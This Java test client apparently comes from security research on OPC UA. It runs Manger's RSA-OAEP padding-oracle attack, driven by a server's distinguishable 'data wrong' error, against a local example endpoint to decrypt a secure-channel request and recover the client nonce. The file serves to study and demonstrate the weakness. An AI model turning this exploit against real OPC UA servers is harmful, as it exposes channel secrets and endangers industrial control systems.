import attacks.CipherTextUtility;
import attacks.manger.MangersAttack;
import attacks.manger.oracle.DistinguishableErrorOracle;
import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import opcua.context.Endpoint;
import opcua.context.LocalKeyPair;
import opcua.context.StaticConfig;
import opcua.encoding.EncodingException;
import opcua.message.OpenSecureChannelRequest;
import opcua.model.type.SecurityTokenRequestType;
import opcua.security.MessageSecurityMode;
import opcua.security.OAEPUtility;
import opcua.security.SecurityPolicy;
import opcua.util.MessageUtility;
import org.apache.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import transport.SecureChannelUtil;
import transport.TransportException;

import java.io.IOException;
import java.security.Security;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.Arrays;

public class TestClient {
    public static void main(String[] args) throws CertificateException, TransportException, EncodingException, OracleException, IOException {
        Security.addProvider(new BouncyCastleProvider());
        LocalKeyPair localKeyPair = LocalKeyPair.generateSelfSigned(2048, "CN=OpcUaAttacker");
        CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
        X509Certificate remoteCertificate = (X509Certificate) certificateFactory.generateCertificate(TimingTest.class.getClassLoader().getResourceAsStream("ua-java-ServerExample1.der"));


        Endpoint uaJava = new Endpoint(
                "localhost",
                8666,
                "opc.tcp://localhost:8666/UAExample",
                remoteCertificate,
                SecurityPolicy.AES256_SHA256_RSAPSS,
                MessageSecurityMode.SIGN_AND_ENCRYPT
        );

        // Generate the client nonce
        byte[] clientNonce = SecureChannelUtil.generateRandomNonce(uaJava.getSecurityPolicy());
        // Generate encrypted OpenSecureChannelRequest
        OpenSecureChannelRequest opnRequest = new OpenSecureChannelRequest(
                StaticConfig.PROTOCOL_VERSION, SecurityTokenRequestType.ISSUE,
                uaJava.getMessageSecurityMode(), clientNonce, StaticConfig.REQUESTED_LIFETIME);
        byte[] cipherText = MessageUtility.getSignedEncrypted(opnRequest, uaJava, localKeyPair);
        
        //Execute attack
        Oracle oracle = new DistinguishableErrorOracle(uaJava, error -> error.getReason().contains("data wrong"), cipherText, 0);
        byte[] cipherBlock = CipherTextUtility.extractCipherBlock(cipherText, 0, localKeyPair.getPublicKey());
        MangersAttack attack = new MangersAttack(cipherBlock, oracle, uaJava.getPublicKey());
        byte[] oaepEncodedPlaintext = attack.executeAttack();
        byte[] result = OAEPUtility.decode(oaepEncodedPlaintext);
        byte[] recoveredSecret = Arrays.copyOfRange(result, 57, 57+32);
        System.out.println(Arrays.compare(clientNonce, recoveredSecret));
    }
}
